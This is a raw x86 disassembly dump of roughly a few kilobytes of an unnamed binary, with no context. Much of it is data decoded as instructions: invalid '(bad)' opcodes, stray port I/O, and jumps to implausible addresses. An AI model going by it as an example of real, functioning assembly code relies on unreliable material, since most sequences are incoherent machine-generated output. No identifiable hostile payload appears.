  429cac:	xor    ecx,DWORD PTR [ebp-0x45]
  429caf:	(bad)  
  429cb1:	rol    BYTE PTR [eax],0xc1
  429cb4:	ret    
  429cb5:	inc    ebp
  429cb6:	inc    ebp
  429cb7:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  429cbd:	xor    eax,ebx
  429cbf:	add    eax,DWORD PTR [ebp+0x23]
  429cc2:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  429cc8:	cmp    edi,0xc
  429ccb:	dec    ebp
  429ccc:	inc    ebp
  429ccd:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  429cd3:	inc    ebp
  429cd4:	mov    esi,DWORD PTR [ebx]
  429cd6:	clc    
  429cd7:	lea    eax,[ebp+0x45725407]
  429cdd:	add    BYTE PTR [ebp+eax*2-0x75],dh
  429ce1:	xor    edi,DWORD PTR [eax]
  429ce3:	mov    ecx,0xff8b8d4d
  429ce8:	push   esp
  429ce9:	enter  0x4df7,0x23
  429ced:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  429cf3:	mov    eax,DWORD PTR [ebx]
  429cf5:	loopne 0x429ce2
  429cf7:	ret    0xc68b
  429cfa:	push   esp
  429cfb:	enter  0x9745,0x8b
  429cff:	inc    ebp
  429d00:	cld    
  429d01:	mov    eax,edi
  429d03:	clc    
  429d04:	ret    
  429d05:	ret    0xc645
  429d08:	mov    esi,DWORD PTR [ebx]
  429d0a:	cld    
  429d0b:	pop    esi
  429d0c:	mov    ebx,0x83458bc3
  429d12:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  429d16:	dec    ebp
  429d17:	cmp    BYTE PTR [ebx],dh
  429d19:	pushf  
  429d1a:	add    edi,DWORD PTR [edx-0x7767a77]
  429d20:	fcom   DWORD PTR [ebp+0x45]
  429d23:	mov    edi,DWORD PTR [edx]
  429d25:	adc    al,0x9c
  429d27:	inc    ebp
  429d28:	(bad)  
  429d29:	mov    ebx,eax
  429d2b:	adc    al,0x85
  429d2d:	cmp    al,0x1
  429d30:	inc    ebp
  429d31:	add    BYTE PTR [ecx*2-0x74167464],bh
  429d38:	add    edx,DWORD PTR [eax-0x74bb0000]
  429d3e:	xor    eax,DWORD PTR [ebx]
  429d40:	add    edi,DWORD PTR [ecx+ecx*4]
  429d43:	mov    esp,esi
  429d45:	clc    
  429d46:	inc    ebp
  429d47:	inc    ebp
  429d48:	add    edx,DWORD PTR [esi+0xc]
  429d4b:	mov    edi,0x7ff0845
  429d50:	in     al,dx
  429d51:	(bad)  
  429d52:	jne    0x429cec
  429d54:	mov    esi,DWORD PTR [edx]
  429d56:	clc    
  429d57:	add    ebp,DWORD PTR [edx]
  429d59:	mov    edi,edi
  429d5b:	in     al,dx
  429d5c:	mov    DWORD PTR [ebp-0x10],eax
  429d5f:	xor    eax,DWORD PTR [ebp+0x3]
  429d62:	and    BYTE PTR [ecx+0x458bf49c],cl
  429d68:	fmul   DWORD PTR [ebx-0x173caf39]
  429d6e:	lea    ecx,[ecx+0x45e8d4bc]
  429d74:	clc    
  429d75:	mov    edi,edi
  429d77:	cmp    BYTE PTR [ebp+0x4d],al
  429d7a:	test   DWORD PTR [eax+0x74],ecx
  429d7d:	inc    ecx
  429d7e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  429d84:	ret    
  429d85:	inc    eax
  429d86:	dec    DWORD PTR [ebx+0x4945f8f0]
  429d8c:	push   eax
  429d8d:	dec    eax
  429d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d8f:	sar    bh,1
  429d91:	enter  0x458b,0xec
  429d95:	mov    eax,DWORD PTR [ebp+0x38]
  429d98:	mov    eax,ecx
  429d9a:	fadd   DWORD PTR [ebx]
  429d9c:	dec    ebp
  429d9d:	inc    eax
  429d9e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  429da4:	inc    ebp
  429da5:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  429dab:	fadd   QWORD PTR [ebx]
  429dad:	inc    ebp
  429dae:	or     al,0x33
  429db0:	dec    ebp
  429db1:	add    edi,DWORD PTR [ebx]
  429db3:	mov    DWORD PTR [edx-0x28],esi
  429db6:	mov    eax,DWORD PTR [ebp-0x10]
  429db9:	mov    eax,DWORD PTR [eax+0x10]
  429dbc:	mov    eax,edi
  429dbe:	lock ret 
  429dc0:	inc    ecx
  429dc1:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  429dc7:	fsubr  st,st(5)
  429dc9:	test   DWORD PTR [eax],eax
  429dcb:	clc    
  429dcc:	push   0x45
  429dce:	(bad)  
  429dcf:	cmp    ebp,esp
  429dd1:	pushf  
  429dd2:	inc    ebp
  429dd3:	(bad)  
  429dd4:	push   eax
  429dd5:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  429dd9:	clc    
  429dda:	mov    eax,0xf8008584
  429ddf:	mov    eax,DWORD PTR [ebp-0x4]
  429de2:	mov    edi,0x4585c3cc
  429de8:	clc    
  429de9:	mov    eax,DWORD PTR [ebp+0x14]
  429dec:	cmp    al,BYTE PTR [ebp-0x64]
  429def:	mov    edi,eax
  429df1:	in     al,dx
  429df2:	les    esi,FWORD PTR [ebp-0x7b]
  429df5:	mov    edi,eax
  429df7:	or     al,0x4d
  429df9:	dec    ebp
  429dfa:	mov    eax,ebp
  429dfc:	in     al,0xf2
  429dfe:	dec    ebp
  429dff:	dec    DWORD PTR [ecx+0x4dc7e045]
  429e05:	fmul   DWORD PTR [ecx+0x4df8f085]
  429e0b:	inc    ebp
  429e0c:	mov    DWORD PTR [ebx],esi
  429e0e:	fadd   QWORD PTR [ebx]
  429e10:	dec    ebp
  429e11:	push   eax
  429e12:	xor    eax,DWORD PTR [ebp+0x3]
  429e15:	push   eax
  429e16:	mov    DWORD PTR [eax],ebx
  429e18:	fdivr  st,st(7)
  429e1a:	test   BYTE PTR [ebx-0x3fc21000],0x85
  429e21:	dec    esi
  429e22:	clc    
  429e23:	inc    ebp
  429e24:	test   BYTE PTR [ebx],dh
  429e26:	add    DWORD PTR [ebx],eax
  429e28:	add    BYTE PTR [eax+0x4d],dl
  429e2b:	jne    0x429e60
  429e2d:	lea    ecx,[ebx-0x7617fc44]
  429e33:	div    ah
  429e35:	inc    DWORD PTR [ebp+0x45]
  429e38:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  429e3e:	jb     0x429dcb
  429e40:	add    BYTE PTR [eax*2-0x17ba743f],cl
  429e47:	mov    ecx,DWORD PTR [ebp-0x10]
  429e4a:	xor    ecx,DWORD PTR [ebp+0x3]
  429e4d:	mov    edi,DWORD PTR [ebx]
  429e4f:	adc    BYTE PTR [ebp+0x41],dh
  429e52:	mov    ecx,DWORD PTR [ebx-0x37382704]
  429e58:	ret    
  429e59:	push   ss
  429e5a:	push   0x45
  429e5c:	lea    ecx,[ebx+0x4de80cb0]
  429e62:	sti    
  429e63:	add    edi,edi
  429e65:	or     BYTE PTR [ebp+0x4d],al
  429e68:	mov    ebp,DWORD PTR [ebx]
  429e6a:	xor    ebp,ecx
  429e6c:	mov    al,BYTE PTR [edx]
  429e6e:	add    eax,0xc7200
  429e73:	jne    0x429ec2
  429e75:	lea    esi,[ebx]
  429e77:	mov    al,0xf
  429e79:	call   0xe953e
  429e7e:	sar    DWORD PTR [eax],0x84
  429e81:	pushf  
  429e82:	add    DWORD PTR [ecx+0x4545d000],ecx
  429e88:	mov    edi,DWORD PTR [ecx]
  429e8a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  429e91:	test   DWORD PTR [eax],eax
  429e93:	clc    
  429e94:	dec    ebp
  429e95:	inc    ebp
  429e96:	xor    edi,DWORD PTR [ebx]
  429e98:	setl   al
  429e9b:	(bad)  
  429e9c:	retf   
  429e9d:	rol    cl,1
  429e9f:	dec    ebp
  429ea0:	test   BYTE PTR [ebp+0x4d00cc01],cl
  429ea6:	inc    ebp
  429ea7:	lea    ecx,[ebx-0x75b2cc38]
  429ead:	lea    eax,ds:0x4d72c4
  429eb3:	mov    ecx,DWORD PTR [ebp-0x4]
  429eb6:	xor    ecx,edi
  429eb8:	bswap  ebx
  429eba:	ror    BYTE PTR [ebp-0x35],0xe9
  429ebe:	rol    DWORD PTR [ecx],0x84
  429ec1:	add    BYTE PTR [ecx],al
  429ec3:	cmp    al,BYTE PTR [eax]
  429ec5:	pushf  
  429ec6:	inc    ebp
  429ec7:	jnp    0x8a42d2ca
  429ecd:	mov    eax,DWORD PTR ds:0xcf72e8
  429ed3:	lock dec ebp
  429ed5:	retf   
  429ed6:	xor    ecx,DWORD PTR [ebp+0xf]
  429ed9:	mov    eax,eax
  429edb:	fmul   st,st(3)
  429edd:	test   ecx,0x1988484
  429ee3:	xor    al,BYTE PTR [eax]
  429ee5:	mov    DWORD PTR [ebp-0x28],eax
  429ee8:	mov    eax,DWORD PTR [ebp+0x33]
  429eeb:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  429ef1:	ret    
  429ef2:	add    al,cl
  429ef4:	dec    ebp
  429ef5:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  429efb:	add    ecx,DWORD PTR ds:0xc7250
  429f01:	inc    ebp
  429f02:	rcl    DWORD PTR [eax+0x4d],0x27
  429f06:	mov    edi,edi
  429f08:	xor    ecx,DWORD PTR [ebx+0xde48a]
  429f0e:	jb     0x429ed7
  429f10:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  429f17:	mov    esi,DWORD PTR [ebx]
  429f19:	cld    
  429f1a:	mov    cl,bh
  429f1c:	or     eax,0x372b6
  429f21:	cmp    ecx,eax
  429f23:	jne    0x429fa0
  429f29:	mov    eax,DWORD PTR [ebp-0x20]
  429f2c:	mov    eax,DWORD PTR [eax]
  429f2e:	xor    eax,edi
  429f30:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  429f37:	mov    ecx,DWORD PTR [ebp-0x4]
  429f3a:	mov    ecx,edi
  429f3c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  429f42:	jb     0x429f53
  429f44:	add    BYTE PTR [edi-0x3f],dl
  429f47:	add    BYTE PTR [ebp-0x75],cl
  429f4a:	mov    esi,eax
  429f4c:	xor    eax,DWORD PTR [eax]
  429f4e:	mov    al,bh
  429f50:	or     eax,0x487284
  429f55:	xor    al,cl
  429f57:	mov    ecx,DWORD PTR [ebp-0x4]
  429f5a:	mov    ecx,edi
  429f5c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  429f62:	jb     0x429f73
  429f64:	add    BYTE PTR [edi],dh
  429f66:	enter  0x8500,0x8b
  429f6a:	add    ah,bl
  429f6c:	add    BYTE PTR [eax],al
  429f6e:	inc    ebp
  429f6f:	(bad)  
  429f70:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  429f77:	mov    esi,DWORD PTR [edx-0x4]
  429f7a:	add    bh,cl
  429f7c:	dec    ebp
  429f7d:	mov    dh,0x8b
  429f7f:	add    esi,DWORD PTR [ebx]
  429f81:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  429f87:	add    BYTE PTR [eax],al
  429f89:	mov    eax,ecx
  429f8b:	loopne 0x429fda
  429f8d:	add    BYTE PTR [ebx-0x757bcc39],cl
  429f93:	dec    eax
  429f94:	or     eax,0x8b7232
  429f99:	in     al,0xc1
  429f9b:	or     DWORD PTR [ebp-0x31],ecx
  429f9e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  429fa5:	xor    dh,BYTE PTR [edx-0x75]
  429fa8:	add    al,dh
  429faa:	enter  0x4f09,0xcf
  429fae:	inc    ebp
  429faf:	mov    WORD PTR [ebx-0x75cdccb8],cs
  429fb5:	or     al,BYTE PTR ds:0xe4728b
  429fbb:	or     DWORD PTR [ebp-0x31],ecx
  429fbe:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  429fc5:	cmp    dh,BYTE PTR [edx+0xf]
  429fc8:	add    bl,dl
  429fca:	rol    DWORD PTR [eax],0x4d
  429fcd:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  429fd3:	(bad)  
  429fd4:	or     eax,0x487284
  429fd9:	xor    al,cl
  429fdb:	mov    ecx,DWORD PTR [ebp-0x20]
  429fde:	mov    ecx,DWORD PTR [ecx]
  429fe0:	xor    ecx,edi
  429fe2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  429fe9:	xor    cl,al
  429feb:	mov    ecx,DWORD PTR [edi]
  429fed:	fadd   QWORD PTR [ebp+0x9]
  429ff0:	call   0xffcf9ac4
  429ff5:	dec    eax
  429ff6:	dec    ebp
  429ff7:	xor    bh,BYTE PTR [ebx]
  429ff9:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  429ffd:	loopne 0x429ffb
  429fff:	or     edi,eax
  42a001:	iret   
  42a002:	ret    
  42a003:	mov    WORD PTR [ebp+0x4c],es
  42a006:	mov    esi,DWORD PTR [edx]
  42a008:	call   0x84526747
  42a00d:	(bad)  
  42a00e:	cwde   
  42a00f:	add    BYTE PTR [edx],dh
  42a011:	mov    esi,DWORD PTR [ebx]
  42a013:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a019:	test   BYTE PTR [ebx],dh
  42a01b:	dec    eax
  42a01c:	add    esi,DWORD PTR [edx]
  42a01e:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a024:	dec    edi
  42a026:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a02d:	xor    al,BYTE PTR [ebx]
  42a02f:	mov    edi,DWORD PTR [ebx]
  42a031:	in     al,0x75
  42a033:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a039:	dec    eax
  42a03a:	xor    esi,DWORD PTR [edx]
  42a03c:	lea    ecx,[edx]
  42a03e:	or     BYTE PTR [ebx+0x900f072],cl
  42a044:	ja     0x42a015
  42a046:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a04d:	cmp    ch,al
  42a04f:	jne    0x42a044
  42a051:	mov    edi,edi
  42a053:	fadd   QWORD PTR [ebp+0x0]
  42a056:	mov    eax,edi
  42a058:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a05f:	mov    edx,DWORD PTR [ebx]
  42a061:	in     al,0x45
  42a063:	or     DWORD PTR [ebx],esi
  42a065:	iret   
  42a066:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a06d:	xor    dl,BYTE PTR [eax-0x75]
  42a070:	sbb    al,ah
  42a072:	dec    DWORD PTR [ecx]
  42a074:	mov    ecx,edi
  42a076:	in     al,dx
  42a077:	mov    eax,es
  42a079:	dec    eax
  42a07a:	mov    DWORD PTR [edx],esi
  42a07c:	fmul   QWORD PTR [edx]
  42a07e:	jne    0x42a00b
  42a080:	(bad)  
  42a081:	(bad)  
  42a083:	or     DWORD PTR [ebp-0x31],eax
  42a086:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a08d:	cmp    bh,bh
  42a08f:	jne    0x42a0d6
  42a091:	lea    ecx,[ebx-0x38372750]
  42a097:	inc    ebx
  42a099:	mov    eax,ecx
  42a09b:	mov    eax,0xa00c111
  42a0a0:	jne    0x42a0e7
  42a0a2:	mov    esi,DWORD PTR [ebx]
  42a0a4:	test   al,0x3
  42a0a6:	inc    ebp
  42a0a7:	mov    DWORD PTR [eax-0xc],edx
  42a0aa:	fiadd  WORD PTR [ebp-0x1]
  42a0ad:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a0b3:	jb     0x42a0b6
  42a0b5:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a0bb:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a0c1:	retf   
  42a0c2:	mov    edx,ecx
  42a0c4:	adc    al,0x84
  42a0c6:	(bad)  
  42a0c7:	std    
  42a0c8:	ret    
  42a0c9:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a0cf:	hlt    
  42a0d0:	rol    edi,0x82
  42a0d3:	ret    
  42a0d4:	cld    
  42a0d5:	enter  0x11ff,0x45
  42a0d9:	inc    ebp
  42a0da:	pop    edi
  42a0db:	mov    ebx,DWORD PTR [ebx+0x14]
  42a0de:	ret    0xc7
  42a0e1:	test   BYTE PTR [ebx+0x45325198],cl
  42a0e7:	jmp    0x42a074
  42a0e9:	push   0x8
  42a0eb:	call   DWORD PTR [esi]
  42a0ed:	in     al,dx
  42a0ee:	add    BYTE PTR [ebp+0x1],0x50
  42a0f2:	add    bl,ah
  42a0f4:	add    bh,bh
  42a0f6:	icebp  
  42a0f7:	mov    ecx,DWORD PTR [eax]
  42a0f9:	cld    
  42a0fa:	pop    es
  42a0fb:	dec    ebp
  42a0fc:	shl    DWORD PTR [ebx],0x72
  42a0ff:	add    eax,DWORD PTR [eax]
  42a101:	cmp    edx,ecx
  42a103:	je     0x42a115
  42a105:	mov    esi,DWORD PTR [ebp-0x4]
  42a108:	inc    edi
  42a10a:	or     al,0xc3
  42a10c:	jmp    FWORD PTR [edx-0x18]
  42a10f:	(bad)  
  42a110:	sti    
  42a111:	cwde   
  42a112:	(bad)  
  42a113:	call   0xffa09a1e
  42a118:	or     al,0x45
  42a11a:	push   ebp
  42a11b:	sub    esp,0x18
  42a11e:	push   ebx
  42a11f:	inc    ebp
  42a120:	mov    edi,edi
  42a122:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a129:	test   al,0x50
  42a12b:	inc    ebp
  42a12c:	push   ecx
  42a12d:	push   eax
  42a12e:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a134:	add    ah,bh
  42a136:	(bad)  
  42a137:	dec    ebp
  42a138:	add    DWORD PTR [ebx],esi
  42a13a:	inc    ebp
  42a13b:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a141:	push   0xffffff8b
  42a143:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a149:	add    eax,DWORD PTR [ecx]
  42a14b:	or     BYTE PTR [eax],al
  42a14d:	call   0xff849952
  42a152:	mov    eax,DWORD PTR [ebp+0x14]
  42a155:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a15b:	inc    ebp
  42a15c:	dec    ecx
  42a15d:	add    ebp,DWORD PTR [edx+0x14]
  42a160:	push   0x8b3045
  42a165:	call   0x33aceeda
  42a16a:	inc    DWORD PTR [ebx]
  42a16c:	mov    DWORD PTR [edi],ecx
  42a16e:	mov    eax,ecx
  42a170:	or     BYTE PTR [ebp-0x3d],cl
  42a173:	cmp    eax,edi
  42a175:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a17a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a180:	adc    al,0xc9
  42a182:	inc    ebp
  42a183:	adc    BYTE PTR [eax+0x55],dl
  42a186:	jne    0x42a174
  42a188:	call   0xff53a118
  42a18d:	dec    ebp
  42a18e:	inc    ebp
  42a18f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a195:	add    BYTE PTR [ebx],bh
  42a197:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a19b:	push   eax
  42a19c:	or     al,0x51
  42a19e:	dec    ebp
  42a19f:	xor    DWORD PTR [ebx],0xf320398
  42a1a5:	cmp    eax,DWORD PTR [ebp+0x74]
  42a1a8:	mov    edi,edi
  42a1aa:	pop    edi
  42a1ab:	adc    BYTE PTR [ebx+0x75],bl
  42a1ae:	ret    0x50
  42a1b1:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a1b5:	(bad)  
  42a1b6:	clc    
  42a1b7:	mov    esp,ebp
  42a1b9:	pop    ecx
  42a1ba:	mov    ecx,0xf80085c2
  42a1bf:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a1c2:	push   esi
  42a1c3:	push   esi
  42a1c4:	(bad)  
  42a1c5:	lock add DWORD PTR [ebp+0x44],eax
  42a1c9:	mov    edx,DWORD PTR [eax]
  42a1cb:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a1cf:	or     BYTE PTR [eax+0x7],dl
  42a1d2:	push   ecx
  42a1d3:	ret    
  42a1d4:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a1da:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a1e0:	or     al,0x80
  42a1e2:	jge    0x42a1e5
  42a1e4:	mov    DWORD PTR [eax],eax
  42a1e6:	and    al,0x8
  42a1e8:	cmp    DWORD PTR [ebp+0x10],eax
  42a1eb:	mov    edx,DWORD PTR [esi]
  42a1ed:	xchg   esp,eax
  42a1ee:	dec    esp
  42a1ef:	add    BYTE PTR [eax],dl
  42a1f1:	mov    ecx,edx
  42a1f3:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a1f7:	dec    ebp
  42a1f8:	into   
  42a1f9:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a1ff:	mov    edx,DWORD PTR [eax+0x14]
  42a202:	das    
  42a203:	add    al,0x45
  42a205:	add    BYTE PTR [ebp+0x0],dh
  42a208:	mov    edi,edi
  42a20a:	and    al,0x50
  42a20c:	mov    eax,DWORD PTR [eax]
  42a20e:	and    al,0xd1
  42a210:	xor    eax,DWORD PTR [esi]
  42a212:	lea    eax,[ebp+0x8]
  42a215:	xor    esi,DWORD PTR [edx+0x3]
  42a218:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a21e:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a224:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a22e:	cmp    edi,edi
  42a230:	pushf  
  42a231:	mov    edi,edi
  42a233:	or     BYTE PTR [esi+ecx*1],cl
  42a236:	jne    0x42a1fb
  42a238:	call   0xba204
  42a23d:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a241:	mov    ebx,DWORD PTR [eax]
  42a243:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a247:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a24f:	pop    esi
  42a250:	dec    ecx
  42a252:	and    al,0x10
  42a254:	call   DWORD PTR [ebp+0x24]
  42a257:	in     al,dx
  42a258:	call   0xffc6a141
  42a25d:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a261:	pushf  
  42a262:	pop    esi
  42a263:	mov    ebp,esp
  42a265:	and    al,0xc2
  42a267:	push   edi
  42a268:	add    BYTE PTR [ecx+0x3a],al
  42a26b:	mov    DWORD PTR [ebp+0x24],esi
  42a26e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a274:	dec    DWORD PTR [eax]
  42a276:	and    al,0x7
  42a278:	(bad)  
  42a279:	cli    
  42a27a:	and    al,0x98
  42a27c:	or     BYTE PTR [edx],dh
  42a27e:	sbb    BYTE PTR [ebx],al
  42a280:	adc    al,0x89
  42a282:	jmp    DWORD PTR [esp]
  42a285:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a28b:	adc    al,0x8
  42a28d:	dec    ebp
  42a28e:	adc    BYTE PTR [ebp-0x7c],dh
  42a291:	mov    esi,DWORD PTR [edx]
  42a293:	and    al,0x24
  42a295:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a29b:	add    edi,eax
  42a29d:	pcmpeqb mm1,mm2
  42a2a0:	jmp    0x42a2ee
  42a2a2:	dec    DWORD PTR [eax]
  42a2a4:	je     0x42a291
  42a2a6:	mov    edi,DWORD PTR [ecx]
  42a2a8:	pop    ebp
  42a2a9:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a2ad:	cwde   
  42a2ae:	mov    DWORD PTR [eax-0x8],ebp
  42a2b1:	jge    0x42a31b
  42a2b3:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a2b9:	push   dx
  42a2bb:	adc    BYTE PTR [eax],al
  42a2bd:	push   0x23001022
  42a2c2:	adc    BYTE PTR es:[eax],al
  42a2c5:	push   edi
  42a2c6:	cmp    eax,0x577c0010
  42a2cb:	adc    BYTE PTR [eax],al
  42a2cd:	cli    
  42a2ce:	push   esp
  42a2cf:	adc    BYTE PTR [eax],al
  42a2d1:	sub    dh,BYTE PTR [edi+0x10]
  42a2d4:	add    BYTE PTR [edi+0x5],cl
  42a2d7:	adc    BYTE PTR [eax],al
  42a2d9:	mov    dh,0x6e
  42a2db:	adc    BYTE PTR [eax],al
  42a2dd:	xor    DWORD PTR [ecx+0x10],esp
  42a2e0:	add    BYTE PTR [edx],bl
  42a2e2:	jg     0x42a2f4
  42a2e4:	add    BYTE PTR [ecx-0x42ffbd5e],bh
  42a2ea:	mov    ds:0xa2c10042,al
  42a2ef:	inc    edx
  42a2f0:	add    ch,al
  42a2f2:	mov    ds:0xa2c90042,al
  42a2f7:	inc    edx
  42a2f8:	add    ch,cl
  42a2fa:	mov    ds:0xa2d10042,al
  42a2ff:	inc    edx
  42a300:	add    ch,dl
  42a302:	mov    ds:0xa2d90042,al
  42a307:	inc    edx
  42a308:	add    ch,bl
  42a30a:	mov    ds:0xa2e10042,al
  42a30f:	inc    edx
  42a310:	add    BYTE PTR [edi-0x56ffefba],bh
  42a316:	sbb    BYTE PTR [eax],dl
  42a318:	add    dl,cl
  42a31a:	dec    edi
  42a31b:	adc    BYTE PTR [eax],al
  42a31d:	cmp    cl,BYTE PTR [eax+0x10]
  42a320:	add    BYTE PTR [eax+ebx*2],bl
  42a323:	adc    BYTE PTR [eax],al
  42a325:	rol    DWORD PTR [eax+edx*1],cl
  42a328:	add    dl,cl
  42a32a:	push   ecx
  42a32b:	adc    BYTE PTR [eax],al
  42a32d:	add    bh,BYTE PTR [ecx+0x10]
  42a330:	add    BYTE PTR [ecx],dl
  42a332:	mov    ds:0xa3150042,eax
  42a337:	inc    edx
  42a338:	add    BYTE PTR [ecx],bl
  42a33a:	mov    ds:0xa31d0042,eax
  42a33f:	inc    edx
  42a340:	add    BYTE PTR [ecx],ah
  42a342:	mov    ds:0xa3250042,eax
  42a347:	inc    edx
  42a348:	add    BYTE PTR [ecx],ch
  42a34a:	mov    ds:0xa32d0042,eax
  42a34f:	inc    edx
  42a350:	add    BYTE PTR [edi+0x42001008],ch
  42a356:	dec    esi
  42a357:	adc    BYTE PTR [eax],al
  42a359:	dec    eax
  42a35a:	and    edx,DWORD PTR [eax]
  42a35c:	add    BYTE PTR [edi+0x3d],ah
  42a35f:	adc    BYTE PTR [eax],al
  42a361:	sub    DWORD PTR [eax+edx*1+0x0],eax
  42a365:	jbe    0x42a375
  42a367:	adc    BYTE PTR [eax],al
  42a369:	add    bh,BYTE PTR [edx]
  42a36b:	adc    BYTE PTR [eax],al
  42a36d:	jo     0x42a3d4
  42a36f:	adc    BYTE PTR [eax],al
  42a371:	push   ecx
  42a372:	mov    ds:0xa3550042,eax
  42a377:	inc    edx
  42a378:	add    BYTE PTR [ecx-0x5d],bl
  42a37b:	inc    edx
  42a37c:	add    BYTE PTR [ebp-0x5d],bl
  42a37f:	inc    edx
  42a380:	add    BYTE PTR [ecx-0x5d],ah
  42a383:	inc    edx
  42a384:	add    BYTE PTR [ebp-0x5d],ah
  42a387:	inc    edx
  42a388:	add    BYTE PTR [ecx-0x5d],ch
  42a38b:	inc    edx
  42a38c:	add    BYTE PTR [ebp-0x5d],ch
  42a38f:	inc    edx
  42a390:	add    BYTE PTR [edx+0x3a001008],ch
  42a396:	add    dl,BYTE PTR [eax]
  42a398:	add    BYTE PTR [edx+eiz*2],bl
  42a39b:	adc    BYTE PTR [eax],al
  42a39d:	xor    ecx,DWORD PTR ds:0x5a6b0010
  42a3a3:	adc    BYTE PTR [eax],al
  42a3a5:	cmp    eax,0x8500103b
  42a3aa:	arpl   WORD PTR [eax],dx
  42a3ac:	add    bl,ah
  42a3ae:	pop    ebp
  42a3af:	adc    BYTE PTR [eax],al
  42a3b1:	xchg   ecx,eax
  42a3b2:	mov    ds:0xa3950042,eax
  42a3b7:	inc    edx
  42a3b8:	add    BYTE PTR [ecx-0x62ffbd5d],bl
  42a3be:	mov    ds:0xa3a10042,eax
  42a3c3:	inc    edx
  42a3c4:	add    BYTE PTR [ebp-0x56ffbd5d],ah
  42a3ca:	mov    ds:0xa3ad0042,eax
  42a3cf:	inc    edx
  42a3d0:	add    bl,bl
  42a3d2:	push   esp
  42a3d3:	adc    BYTE PTR [eax],al
  42a3d5:	cwde   
  42a3d6:	xor    al,0x10
  42a3d8:	add    BYTE PTR [ebp-0x2affeff4],dh
  42a3de:	xor    al,0x10
  42a3e0:	add    BYTE PTR [esi+0x17001027],bh
  42a3e6:	push   edi
  42a3e7:	adc    BYTE PTR [eax],al
  42a3e9:	add    dl,BYTE PTR [ebx]
  42a3eb:	adc    BYTE PTR [eax],al
  42a3ed:	retf   0x101a
  42a3f0:	add    cl,dl
  42a3f2:	mov    ds:0xa3d50042,eax
  42a3f7:	inc    edx
  42a3f8:	add    cl,bl
  42a3fa:	mov    ds:0xa3dd0042,eax
  42a3ff:	inc    edx
  42a400:	add    cl,ah
  42a402:	mov    ds:0xa3e50042,eax
  42a407:	inc    edx
  42a408:	add    cl,ch
  42a40a:	mov    ds:0xa3ed0042,eax
  42a40f:	inc    edx
  42a410:	add    BYTE PTR [ebp+0x30],dl
  42a413:	dec    edx
  42a414:	cmp    DWORD PTR [edi+0x51],ebx
  42a417:	cmp    BYTE PTR [edx+0x38],bl
  42a41a:	push   edx
  42a41b:	add    BYTE PTR [ebp+0x59],cl
  42a41e:	inc    ebx
  42a41f:	cmp    DWORD PTR [edi+0x46],ebx
  42a422:	inc    ebp
  42a423:	xor    eax,0x5958535f
  42a428:	add    BYTE PTR [esi+0x30],dl
  42a42b:	push   esi
  42a42c:	xor    DWORD PTR [edi+0x33],ebx
  42a42f:	dec    esp
  42a430:	push   ebx
  42a431:	push   ebx
  42a432:	xor    esi,DWORD PTR ds:0x59003135
  42a438:	push   eax
  42a439:	inc    ebp
